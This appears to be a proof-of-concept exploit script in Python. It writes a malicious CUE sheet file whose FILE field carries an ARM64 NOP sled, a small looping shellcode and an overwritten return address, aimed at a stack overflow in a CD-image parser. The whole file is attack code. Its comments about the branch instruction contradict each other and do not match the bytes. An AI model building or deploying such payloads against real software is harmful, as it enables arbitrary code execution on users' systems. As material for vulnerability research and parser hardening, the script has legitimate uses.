#!/usr/bin/env python3
import struct

# ARM64 infinite loop shellcode
# b #0 means branch to next instruction, creating tight loop
shellcode = b"\xff\xff\xff\x17"  # b #-1 (branch to self)

nop = b"\x1f\x20\x03\xd5"
nop_sled = nop * 400

payload = nop_sled + shellcode
payload = payload.ljust(2144, b"A")

# Return address points to shellcode
payload += b"\x48\xe3\xff\xff\xff\xff\xff\xff"

with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(payload)
    f.write(b'" BINARY\n')
    f.write(b'TRACK 01 MODE1/2352\n')
    f.write(b'  INDEX 01 00:00:00\n')

